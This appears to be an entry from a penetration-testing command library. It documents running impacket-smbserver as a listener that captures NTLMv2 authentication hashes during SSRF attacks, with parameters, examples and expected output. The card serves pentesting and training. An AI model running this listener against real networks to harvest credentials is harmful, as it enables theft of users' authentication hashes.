---
id: cmd-uuid-1
data: impacket-smbserver share . -smb2support -debug
tags:
  - smb
  - listener
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.059Z'
verified: false
validated: true
submitted: true
---
# impacket-smbserver-listen

## Command

```bash
impacket-smbserver share . -smb2support -debug
```

## Description

Starts an SMB server using Impacket to listen for connections, capturing authentication attempts including NTLMv2 hashes during SSRF exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `share` | Name of the SMB share | Yes |
| `.` | Directory to serve files from | Yes |
| `-smb2support` | Enable SMB2 protocol support | No |
| `-debug` | Enable debug logging | No |

## Examples

### Basic Usage

```bash
impacket-smbserver public /tmp/share
```

### Advanced Usage

```bash
impacket-smbserver share . -smb2support -debug -ip 0.0.0.0
```

## Expected Output

Server logs incoming connections, e.g., 'Incoming connection (XXX.XXX.XXX.XXX,445)', followed by auth details like NTLMv2 challenges.

## Related

- [[Related Procedure: Set-Up-SMB-Listener-to-Capture-Authentication]]
